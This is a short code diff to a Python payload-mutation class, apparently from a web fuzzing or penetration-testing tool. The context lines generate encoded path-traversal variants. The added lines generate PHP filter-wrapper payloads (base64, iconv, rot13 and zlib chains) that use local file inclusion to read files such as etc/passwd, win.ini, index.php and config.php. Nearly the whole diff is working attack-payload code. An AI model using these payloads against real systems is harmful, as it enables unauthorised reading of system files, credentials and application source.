@@ -45,6 +45,23 @@ class PayloadMutator:
                 variants.add(payload.replace("../", "..%c0%af"))
                 variants.add(payload.replace("../", "..%252f"))
                 variants.add(payload.replace("../", "..%c1%9c"))
+            elif strategy == "php_wrapper":
+                if "etc/passwd" in payload or "win.ini" in payload:
+                    variants.add("php://filter/convert.base64-encode/resource=" + payload)
+                    variants.add("php://filter/read=convert.base64-encode/resource=" + payload)
+            elif strategy == "php_filter_chain":
+                # For data extraction using complex iconv-based filter chains (Wave 5/5.1)
+                # Example: php://filter/convert.iconv.UTF8.CSUTF16//convert.base64-encode/resource=
+                variants.add(f"php://filter/read=convert.base64-encode/resource={payload}") # Added to set, not list
+                variants.add(f"php://filter/convert.base64-encode/resource={payload}") # Added to set, not list
+                variants.add(f"php://filter/convert.iconv.UTF-8.UTF-16//convert.base64-encode/resource={payload}")
+                variants.add(f"php://filter/convert.iconv.UTF-8.CSUTF16//convert.base64-encode/resource={payload}")
+                variants.add(f"php://filter/read=string.rot13|convert.base64-encode/resource={payload}")
+                variants.add(f"php://filter/zlib.deflate|convert.base64-encode/resource={payload}")
+            elif strategy == "lfi_chain":
+                 # Advanced PHP Filter Chain (iconv) bypasses (simplified)
+                 if "index.php" in payload or "config.php" in payload:
+                     variants.add(f"php://filter/convert.iconv.UTF8.CSUTF16//convert.base64-encode/resource={payload}")
                 
         return list(variants)
 
